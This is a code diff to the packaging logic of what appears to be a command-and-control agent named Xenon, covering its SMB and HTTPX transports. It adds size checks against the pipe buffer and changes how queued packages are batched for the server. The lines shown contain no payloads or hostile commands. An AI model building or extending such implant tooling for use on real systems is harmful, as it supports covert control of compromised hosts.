@@ -459,7 +459,21 @@ VOID PackageQueue(PPackage package)
     if ( !package ) {
         return;
     }
-    
+
+
+#ifdef SMB_TRANSPORT
+    /* TODO
+     * Create better solution for this, MAX is quite low.
+    */
+    if ( (package->length + TASK_UUID_SIZE + sizeof(BYTE) + sizeof(UINT32)) > PIPE_BUFFER_MAX )
+    {
+        _err("Package size (%d bytes) exceeds PIPE_BUFFER_MAX (%d bytes). Discarding package...", package->length + TASK_UUID_SIZE + sizeof(BYTE) + sizeof(UINT32), PIPE_BUFFER_MAX);
+        package->Sent = TRUE;
+        return;
+    }
+
+#endif
+
     /* If there are no queued packages, this is the first */
     if ( !xenonConfig->PackageQueue )
     {
@@ -486,11 +500,12 @@ VOID PackageQueue(PPackage package)
 BOOL PackageSendAll(PPARSER response)
 {
 
+    /* Max network package size BEFORE encoding and encryption */
 #ifdef HTTPX_TRANSPORT
-    #define MAX_PACKAGE_SIZE (0x300000 - sizeof(UINT32) - 1024) // 3 mb - 4 bytes - 1 kb
+    #define MAX_PACKAGE_SIZE (MAX_REQUEST_LENGTH * 3 / 4)  // ~2.25MB
 #endif
 #ifdef SMB_TRANSPORT
-    #define MAX_PACKAGE_SIZE (40 * 1024)  // 40 kb raw - becomes ~60KB after b64encoding + SmbId
+    #define MAX_PACKAGE_SIZE (PIPE_BUFFER_MAX * 3 / 4)     // ~48 KB
 #endif
 
     _dbg("Sending All Queued Packages to Server ...");
@@ -522,15 +537,15 @@ BOOL PackageSendAll(PPARSER response)
     {
         if ( (Package->length + Current->length) > MAX_PACKAGE_SIZE )
         {
-            _dbg("[INFO] MAX_PACKAGE_SIZE reached, deferring remaining packages");
-            break;
+            _dbg("[INFO] MAX_PACKAGE_SIZE reached, checking the next package");
+
+            Current = Current->Next;
+            continue;
         }
-
+        
         _dbg("Adding package (%d bytes)", Current->length);
-
         PackageAddBytes(Package, Current->buffer, Current->length, FALSE);
         Current->Sent = TRUE;
-
         Current = Current->Next;
     }
 
